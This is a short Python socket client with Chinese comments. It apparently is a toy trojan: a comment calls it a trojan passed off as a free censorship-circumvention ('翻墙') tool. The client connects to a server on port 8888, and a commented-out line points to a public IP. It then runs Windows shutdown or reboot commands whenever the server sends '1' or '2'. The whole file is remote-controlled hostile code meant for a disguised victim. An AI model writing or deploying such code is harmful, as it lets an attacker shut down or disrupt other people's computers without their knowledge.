# 客户端
import os
from socket import *

# 1、准备一台电话机 / 创建一个套接字
socket = socket()
# 2、电话机拨打电话 / 套接字申请连接
socket.connect((gethostname(), 8888))
# socket.connect(('146.56.223.48', 8888))

# 连上之后 木马 免费翻墙
text = socket.recv(1024).decode()  # 一次最多接受1024个字节
print(text)

choise = socket.recv(1024).decode()
print(choise)
if choise == '1':
    os.system('shutdown -s -t 1')  # 1秒后关机
elif choise == '2':
    os.system('shutdown -r -t 1')  # 1秒后重启

